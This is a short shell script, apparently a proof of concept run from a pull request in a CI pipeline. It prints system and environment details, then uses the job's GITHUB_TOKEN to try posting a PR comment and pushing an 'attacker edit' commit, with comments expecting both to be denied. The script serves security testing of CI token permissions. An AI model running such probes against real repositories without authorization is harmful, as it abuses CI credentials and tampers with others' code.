#!/bin/sh
echo "===== PR-CONTROLLED SCRIPT IS RUNNING ====="
id
uname -a
echo "GITHUB_REPOSITORY=$GITHUB_REPOSITORY PR_NUMBER=$PR_NUMBER"
echo "SHORT_SHA=${GITHUB_SHA}"
echo "--- probe: can the sandbox token write a PR comment? (expect 403)"
code=$(curl -s -o /tmp/resp.json -w '%{http_code}' -X POST \
  -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$PR_NUMBER/comments" \
  -d '{"body":"poc: token write probe"}')
echo "COMMENT_STATUS=$code"
head -c 300 /tmp/resp.json; echo
echo "--- probe: can the sandbox token push to the repo? (expect denied)"
git config user.email poc@example.com
git config user.name poc
echo "attacker edit" >> README.md
git commit -qam "poc push probe"
git push origin HEAD:refs/heads/pr-test 2>&1 | tail -4
echo "===== DONE ====="
